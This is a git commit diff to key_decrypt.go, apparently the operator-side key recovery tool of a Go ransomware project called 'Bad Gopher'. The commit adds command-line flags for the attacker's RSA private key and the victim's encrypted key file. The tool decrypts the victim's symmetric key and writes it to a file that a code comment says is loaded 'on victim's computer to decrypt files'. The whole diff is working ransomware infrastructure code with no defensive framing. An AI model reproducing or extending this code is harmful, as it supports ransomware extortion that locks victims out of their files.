4e6af8938ed8a129a8f0407dca5e975b48cee56a
Andy Smith <andy@ajsmith.us>
2020-01-25 17:16:04 -0500

    Made key_decrypt user-friendly

--- key_decrypt/key_decrypt.go
+++ key_decrypt/key_decrypt.go
@@ -7,6 +7,7 @@ import (
 	"crypto/x509"
 	"encoding/hex"
 	"encoding/pem"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -16,16 +17,27 @@ import (
 func main() {
 	// TODO: Make this more user-friendly, i.e. command line options for selecting
 	// file and ability to drag gopher key file onto exe to generate decryption key
-	privRaw, _ := ioutil.ReadFile("priv.pem")
-	fmt.Println(privRaw)
+	privateKeyPath := flag.String("key", "", "private key")
+	gopherFilePath := flag.String("input", "", "Bad Gopher key file")
+	flag.Parse()
+
+	if _, err := os.Stat(*privateKeyPath); err != nil {
+		fmt.Println("Private key file does not exist or not specified (--key)")
+		return
+	}
+
+	if _, err := os.Stat(*gopherFilePath); err != nil {
+		fmt.Println("Gopher key file does not exist or not specified (--input)")
+		return
+	}
+
+	privRaw, _ := ioutil.ReadFile(*privateKeyPath)
 	privPem, _ := pem.Decode(privRaw)
-	fmt.Println(privPem)
 
 	privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
-	fmt.Println(privKey.D)
 
-	home, _ := os.UserHomeDir()
-	keyFile, _ := os.Open(home + "/BAD_GOPHER.txt")
+	keyFile, _ := os.Open(*gopherFilePath)
+	defer keyFile.Close()
 	keyFileText, _ := ioutil.ReadAll(keyFile)
 	keyFileBytes, _ := hex.DecodeString(string(keyFileText))
 	plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, keyFileBytes, nil)
@@ -38,7 +50,7 @@ func main() {
 	// Save symmetric key to a file that can be loaded on victim's computer to decrypt files
 	symmetricKeyEncoded := hex.EncodeToString(symmetricKey)
 	filename := fmt.Sprintf("BAD_GOPHER_DECRYPT_%s", strings.ReplaceAll(strings.Split(information, "\n")[1], " ", "_")[:10])
-	fmt.Println(filename)
+	fmt.Println("Saved to:", filename)
 	f, _ := os.Create(filename)
 	defer f.Close()
 	f.WriteString(symmetricKeyEncoded)
